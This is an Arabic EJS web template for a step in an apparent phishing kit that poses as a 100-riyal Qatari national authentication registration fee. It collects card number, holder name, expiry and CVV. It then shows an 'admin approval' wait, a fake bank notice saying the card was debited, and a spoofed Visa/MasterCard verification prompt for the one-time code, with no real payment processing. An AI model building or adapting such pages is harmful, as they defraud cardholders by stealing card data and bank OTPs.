<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title><%= title %></title>
    <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/css/bootstrap.min.css">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css">
    <style>
        body {
            font-family: 'Arial', sans-serif;
            background-color: #f5f5f5;
            direction: rtl;
            text-align: right;
        }
        
        .well {
            background-color: #f5f5f5;
            border: 1px solid #e3e3e3;
            border-radius: 4px;
            padding: 30px;
            margin-bottom: 20px;
        }
        
        .page-header {
            border-bottom: 2px solid #8b1538;
            margin-top: 0;
            margin-bottom: 25px;
            padding-bottom: 10px;
        }
        
        .page-header h1 {
            color: #000;
            font-size: 24px;
            font-weight: bold;
            margin: 0;
        }
        
        .payment-info {
            background-color: #e8f4f8;
            border: 1px solid #b8dce8;
            border-radius: 5px;
            padding: 15px;
            margin-bottom: 25px;
            text-align: center;
        }
        
        .payment-info h3 {
            color: #31708f;
            font-size: 18px;
            font-weight: bold;
            margin: 0 0 10px 0;
        }
        
        .payment-info p {
            color: #31708f;
            font-size: 16px;
            margin: 0;
        }
        
        .amount {
            font-size: 24px;
            font-weight: bold;
            color: #8b1538;
        }
        
        .card-form {
            background-color: #fff;
            border: 1px solid #ddd;
            border-radius: 5px;
            padding: 25px;
            margin-bottom: 25px;
        }
        
        .form-group label {
            font-weight: bold;
            color: #333;
        }
        
        .form-control {
            border-radius: 4px;
            border: 1px solid #ccc;
            padding: 10px;
            font-size: 14px;
        }
        
        .form-control:focus {
            border-color: #8b1538;
            box-shadow: 0 0 5px rgba(139, 21, 56, 0.3);
        }
        
        .card-number-group {
            position: relative;
        }
        
        .card-icon {
            position: absolute;
            left: 10px;
            top: 35px;
            width: 40px;
            height: 25px;
            display: none;
        }
        
        .card-icon.visa {
            background: url('data:image/svg+xml;base64,PHN2ZyB3aWR0aD0iNDAiIGhlaWdodD0iMjUiIHZpZXdCb3g9IjAgMCA0MCAyNSIgZmlsbD0ibm9uZSIgeG1sbnM9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnIj4KPHJlY3Qgd2lkdGg9IjQwIiBoZWlnaHQ9IjI1IiByeD0iMyIgZmlsbD0iIzE0MzQ3OCIvPgo8dGV4dCB4PSI1IiB5PSIxOCIgZm9udC1mYW1pbHk9IkFyaWFsIiBmb250LXNpemU9IjE0IiBmb250LXdlaWdodD0iYm9sZCIgZmlsbD0id2hpdGUiPlZJU0E8L3RleHQ+Cjwvc3ZnPgo=') no-repeat center;
            background-size: contain;
            display: block;
        }
        
        .card-icon.mastercard {
            background: url('data:image/svg+xml;base64,PHN2ZyB3aWR0aD0iNDAiIGhlaWdodD0iMjUiIHZpZXdCb3g9IjAgMCA0MCAyNSIgZmlsbD0ibm9uZSIgeG1sbnM9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnIj4KPHJlY3Qgd2lkdGg9IjQwIiBoZWlnaHQ9IjI1IiByeD0iMyIgZmlsbD0iI0VCMDAxQiIvPgo8Y2lyY2xlIGN4PSIxMyIgY3k9IjEyLjUiIHI9IjYiIGZpbGw9IiNGRjVGMDAiLz4KPGNpcmNsZSBjeD0iMjciIGN5PSIxMi41IiByPSI2IiBmaWxsPSIjRkY1RjAwIi8+Cjwvc3ZnPgo=') no-repeat center;
            background-size: contain;
            display: block;
        }
        
        .btn-primary {
            background-color: #8b1538;
            border-color: #8b1538;
            padding: 10px 30px;
            font-size: 16px;
            font-weight: bold;
        }
        
        .btn-primary:hover {
            background-color: #6d1029;
            border-color: #6d1029;
        }
        
        .btn-default {
            padding: 10px 30px;
            font-size: 16px;
        }
        
        .button-group {
            margin-top: 30px;
            text-align: center;
        }
        
        .button-group .btn {
            margin: 0 10px;
        }
        
        .text-danger {
            color: #a94442;
        }
        
        .help-block {
            display: block;
            margin-top: 5px;
            margin-bottom: 10px;
            color: #737373;
            font-size: 12px;
        }
        
        .secure-badge {
            text-align: center;
            margin-top: 20px;
            color: #5cb85c;
            font-size: 14px;
        }
        
        .secure-badge i {
            margin-left: 5px;
        }
        
        /* Modal Styles */
        .modal-content {
            border-radius: 8px;
            text-align: center;
        }
        
        .modal-header {
            border-bottom: 2px solid #8b1538;
        }
        
        .modal-title {
            color: #8b1538;
            font-weight: bold;
        }
        
        .modal-body {
            padding: 30px;
        }
        
        .modal-icon {
            font-size: 60px;
            margin-bottom: 20px;
        }
        
        .modal-icon.waiting {
            color: #f0ad4e;
        }
        
        .modal-icon.verified {
            color: #5cb85c;
        }
        
        .spinner {
            border: 4px solid #f3f3f3;
            border-top: 4px solid #8b1538;
            border-radius: 50%;
            width: 50px;
            height: 50px;
            animation: spin 1s linear infinite;
            margin: 20px auto;
        }
        
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
        
        .otp-inputs {
            display: flex;
            justify-content: center;
            gap: 10px;
            margin: 20px 0;
            direction: ltr;
        }
        
        .otp-input {
            width: 50px;
            height: 50px;
            text-align: center;
            font-size: 24px;
            font-weight: bold;
            border: 2px solid #ccc;
            border-radius: 5px;
        }
        
        .otp-input:focus {
            border-color: #8b1538;
            outline: none;
        }
        
        .bank-message {
            background-color: #f9f9f9;
            border: 1px solid #ddd;
            border-radius: 5px;
            padding: 15px;
            margin: 20px 0;
            text-align: right;
            font-size: 14px;
            color: #333;
        }
        
        .bank-message strong {
            color: #8b1538;
        }
        
        .verified-logo {
            width: 120px;
            margin: 20px auto;
            display: block;
        }
    </style>
</head>
<body>
    <%- include('partials/header') %>
    
    <main>
        <div class="container">
            <div class="row" id="main-content">
                <div class="col-sm-1"></div>
                <div class="col-sm-10">
                    
                    <div class="help-block"></div>
                    <%- include('partials/progress') %>
                    
                    <div class="well">
                        <div class="page-header">
                            <h1>التسديد</h1>
                        </div>
                        
                        <!-- Payment Info -->
                        <div class="payment-info">
                            <h3>المبلغ المطلوب</h3>
                            <p class="amount">100 ريال قطري</p>
                            <p>رسوم التسجيل في نظام التوثيق الوطني</p>
                        </div>
                        
                        <!-- Card Form -->
                        <div class="card-form">
                            <form id="paymentForm" class="form-horizontal">
                                
                                <!-- Card Number -->
                                <div class="form-group card-number-group">
                                    <label class="col-sm-3 control-label" for="cardNumber">رقم البطاقة <span class="text-danger">*</span></label>
                                    <div class="col-sm-9">
                                        <input type="text" class="form-control" id="cardNumber" name="cardNumber" placeholder="1234 5678 9012 3456" maxlength="19" required>
                                        <div class="card-icon" id="cardIcon"></div>
                                        <span class="help-block text-danger" id="cardError" style="display:none;">رقم البطاقة غير صحيح</span>
                                    </div>
                                </div>
                                
                                <!-- Card Holder Name -->
                                <div class="form-group">
                                    <label class="col-sm-3 control-label" for="cardHolder">اسم حامل البطاقة <span class="text-danger">*</span></label>
                                    <div class="col-sm-9">
                                        <input type="text" class="form-control" id="cardHolder" name="cardHolder" placeholder="كما هو مكتوب على البطاقة" required>
                                    </div>
                                </div>
                                
                                <!-- Expiry Date & CVV -->
                                <div class="form-group">
                                    <label class="col-sm-3 control-label">تاريخ الانتهاء <span class="text-danger">*</span></label>
                                    <div class="col-sm-4">
                                        <input type="text" class="form-control" id="expiryDate" name="expiryDate" placeholder="MM/YY" maxlength="5" required>
                                    </div>
                                    <label class="col-sm-2 control-label" for="cvv">CVV <span class="text-danger">*</span></label>
                                    <div class="col-sm-3">
                                        <input type="text" class="form-control" id="cvv" name="cvv" placeholder="123" maxlength="3" required>
                                    </div>
                                </div>
                                
                                <!-- Secure Badge -->
                                <div class="secure-badge">
                                    <i class="fa fa-lock"></i>
                                    معاملتك آمنة ومشفرة
                                </div>
                                
                                <!-- Buttons -->
                                <div class="button-group">
                                    <a href="/step3" class="btn btn-default">رجوع</a>
                                    <button type="submit" class="btn btn-primary" id="payBtn">ادفع الآن</button>
                                </div>
                            </form>
                        </div>
                        
                    </div>
                    
                </div>
                <div class="col-sm-1"></div>
            </div>
        </div>
    </main>
    
    <!-- Waiting Modal -->
    <div class="modal fade" id="waitingModal" tabindex="-1" role="dialog" data-backdrop="static" data-keyboard="false">
        <div class="modal-dialog" role="document">
            <div class="modal-content">
                <div class="modal-header">
                    <h4 class="modal-title">جاري معالجة الدفع</h4>
                </div>
                <div class="modal-body">
                    <div class="modal-icon waiting">
                        <i class="fa fa-credit-card"></i>
                    </div>
                    <div class="card-icon" id="modalCardIcon" style="width: 80px; height: 50px; margin: 20px auto;"></div>
                    <div class="spinner"></div>
                    <p>بانتظار موافقة النظام...</p>
                    <p style="color: #999; font-size: 14px;">يرجى عدم إغلاق هذه النافذة</p>
                </div>
            </div>
        </div>
    </div>
    
    <!-- OTP Modal -->
    <div class="modal fade" id="otpModal" tabindex="-1" role="dialog" data-backdrop="static" data-keyboard="false">
        <div class="modal-dialog" role="document">
            <div class="modal-content">
                <div class="modal-header">
                    <h4 class="modal-title">التحقق الآمن</h4>
                </div>
                <div class="modal-body">
                    <img src="data:image/svg+xml;base64,PHN2ZyB3aWR0aD0iMTIwIiBoZWlnaHQ9IjQwIiB2aWV3Qm94PSIwIDAgMTIwIDQwIiBmaWxsPSJub25lIiB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciPgo8cmVjdCB3aWR0aD0iMTIwIiBoZWlnaHQ9IjQwIiByeD0iNSIgZmlsbD0iIzE0MzQ3OCIvPgo8dGV4dCB4PSIxMCIgeT0iMjYiIGZvbnQtZmFtaWx5PSJBcmlhbCIgZm9udC1zaXplPSIxNiIgZm9udC13ZWlnaHQ9ImJvbGQiIGZpbGw9IndoaXRlIj5WZXJpZmllZCBieSBWSVNBPC90ZXh0Pgo8L3N2Zz4K" class="verified-logo" id="verifiedLogo" alt="Verified">
                    
                    <div class="bank-message">
                        <p><strong>رسالة من البنك:</strong></p>
                        <p>تم خصم مبلغ <strong>100.00 ريال قطري</strong> من بطاقتك المنتهية بـ <strong id="lastDigits">****</strong></p>
                        <p>يرجى إدخال رمز التحقق المرسل إلى هاتفك المسجل</p>
                    </div>
                    
                    <div class="otp-inputs">
                        <input type="text" class="otp-input" maxlength="1" data-index="0">
                        <input type="text" class="otp-input" maxlength="1" data-index="1">
                        <input type="text" class="otp-input" maxlength="1" data-index="2">
                        <input type="text" class="otp-input" maxlength="1" data-index="3">
                        <input type="text" class="otp-input" maxlength="1" data-index="4" style="display:none;">
                        <input type="text" class="otp-input" maxlength="1" data-index="5" style="display:none;">
                    </div>
                    
                    <p style="color: #999; font-size: 14px; margin-top: 20px;">
                        لم تستلم الرمز؟ <a href="#" id="resendOtp" style="color: #8b1538;">إعادة الإرسال</a>
                    </p>
                    
                    <div class="button-group">
                        <button type="button" class="btn btn-default" onclick="location.reload()">إلغاء</button>
                        <button type="button" class="btn btn-primary" id="verifyOtpBtn">تحقق</button>
                    </div>
                </div>
            </div>
        </div>
    </div>
    
    <%- include('partials/footer') %>
    
    <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
    <script src="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/js/bootstrap.min.js"></script>
    <script>
        let cardType = '';
        let otpLength = 4;
        
        // Card number formatting and validation
        document.getElementById('cardNumber').addEventListener('input', function(e) {
            let value = e.target.value.replace(/\s/g, '');
            let formattedValue = value.match(/.{1,4}/g)?.join(' ') || value;
            e.target.value = formattedValue;
            
            // Detect card type
            const cardIcon = document.getElementById('cardIcon');
            const cardError = document.getElementById('cardError');
            
            if (value.length >= 1) {
                const firstDigit = value[0];
                if (firstDigit === '4') {
                    cardType = 'visa';
                    cardIcon.className = 'card-icon visa';
                    cardError.style.display = 'none';
                    otpLength = 6;
                } else if (firstDigit === '5') {
                    cardType = 'mastercard';
                    cardIcon.className = 'card-icon mastercard';
                    cardError.style.display = 'none';
                    otpLength = 4;
                } else {
                    cardType = '';
                    cardIcon.className = 'card-icon';
                    cardError.style.display = 'block';
                }
            } else {
                cardType = '';
                cardIcon.className = 'card-icon';
                cardError.style.display = 'none';
            }
        });
        
        // Expiry date formatting
        document.getElementById('expiryDate').addEventListener('input', function(e) {
            let value = e.target.value.replace(/\D/g, '');
            if (value.length >= 2) {
                value = value.slice(0, 2) + '/' + value.slice(2, 4);
            }
            e.target.value = value;
        });
        
        // CVV - numbers only
        document.getElementById('cvv').addEventListener('input', function(e) {
            e.target.value = e.target.value.replace(/\D/g, '');
        });
        
        // Form submission
        document.getElementById('paymentForm').addEventListener('submit', function(e) {
            e.preventDefault();
            
            const cardNumber = document.getElementById('cardNumber').value.replace(/\s/g, '');
            
            // Validate card
            if (!cardType || cardNumber.length < 16) {
                document.getElementById('cardError').style.display = 'block';
                return;
            }
            
            // Show waiting modal with card icon
            const modalCardIcon = document.getElementById('modalCardIcon');
            modalCardIcon.className = 'card-icon ' + cardType;
            $('#waitingModal').modal('show');
            
            // Simulate admin approval (3 seconds)
            setTimeout(function() {
                $('#waitingModal').modal('hide');
                
                // Update verified logo based on card type
                const verifiedLogo = document.getElementById('verifiedLogo');
                if (cardType === 'visa') {
                    verifiedLogo.src = 'data:image/svg+xml;base64,PHN2ZyB3aWR0aD0iMTIwIiBoZWlnaHQ9IjQwIiB2aWV3Qm94PSIwIDAgMTIwIDQwIiBmaWxsPSJub25lIiB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciPgo8cmVjdCB3aWR0aD0iMTIwIiBoZWlnaHQ9IjQwIiByeD0iNSIgZmlsbD0iIzE0MzQ3OCIvPgo8dGV4dCB4PSIxMCIgeT0iMjYiIGZvbnQtZmFtaWx5PSJBcmlhbCIgZm9udC1zaXplPSIxNiIgZm9udC13ZWlnaHQ9ImJvbGQiIGZpbGw9IndoaXRlIj5WZXJpZmllZCBieSBWSVNBPC90ZXh0Pgo8L3N2Zz4K';
                } else {
                    verifiedLogo.src = 'data:image/svg+xml;base64,PHN2ZyB3aWR0aD0iMTIwIiBoZWlnaHQ9IjQwIiB2aWV3Qm94PSIwIDAgMTIwIDQwIiBmaWxsPSJub25lIiB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciPgo8cmVjdCB3aWR0aD0iMTIwIiBoZWlnaHQ9IjQwIiByeD0iNSIgZmlsbD0iI0VCMDAxQiIvPgo8dGV4dCB4PSIxMCIgeT0iMjYiIGZvbnQtZmFtaWx5PSJBcmlhbCIgZm9udC1zaXplPSIxNCIgZm9udC13ZWlnaHQ9ImJvbGQiIGZpbGw9IndoaXRlIj5NYXN0ZXJDYXJkIFNlY3VyZUNvZGU8L3RleHQ+Cjwvc3ZnPgo=';
                }
                
                // Update last digits
                document.getElementById('lastDigits').textContent = cardNumber.slice(-4);
                
                // Show/hide OTP inputs based on card type
                const otpInputs = document.querySelectorAll('.otp-input');
                otpInputs.forEach((input, index) => {
                    if (index < otpLength) {
                        input.style.display = 'block';
                        input.value = '';
                    } else {
                        input.style.display = 'none';
                    }
                });
                
                // Show OTP modal
                $('#otpModal').modal('show');
                otpInputs[0].focus();
            }, 3000);
        });
        
        // OTP input handling
        const otpInputs = document.querySelectorAll('.otp-input');
        otpInputs.forEach((input, index) => {
            input.addEventListener('input', function(e) {
                if (e.target.value.length === 1) {
                    // Move to next input
                    const nextIndex = index + 1;
                    if (nextIndex < otpLength) {
                        otpInputs[nextIndex].focus();
                    }
                }
            });
            
            input.addEventListener('keydown', function(e) {
                if (e.key === 'Backspace' && e.target.value === '') {
                    // Move to previous input
                    const prevIndex = index - 1;
                    if (prevIndex >= 0) {
                        otpInputs[prevIndex].focus();
                    }
                }
            });
        });
        
        // Verify OTP
        document.getElementById('verifyOtpBtn').addEventListener('click', function() {
            let otp = '';
            for (let i = 0; i < otpLength; i++) {
                otp += otpInputs[i].value;
            }
            
            if (otp.length === otpLength) {
                // Redirect to next step
                window.location.href = '/step5';
            } else {
                alert('يرجى إدخال رمز التحقق كاملاً');
            }
        });
        
        // Resend OTP
        document.getElementById('resendOtp').addEventListener('click', function(e) {
            e.preventDefault();
            alert('تم إعادة إرسال رمز التحقق');
        });
    </script>
</body>
</html>
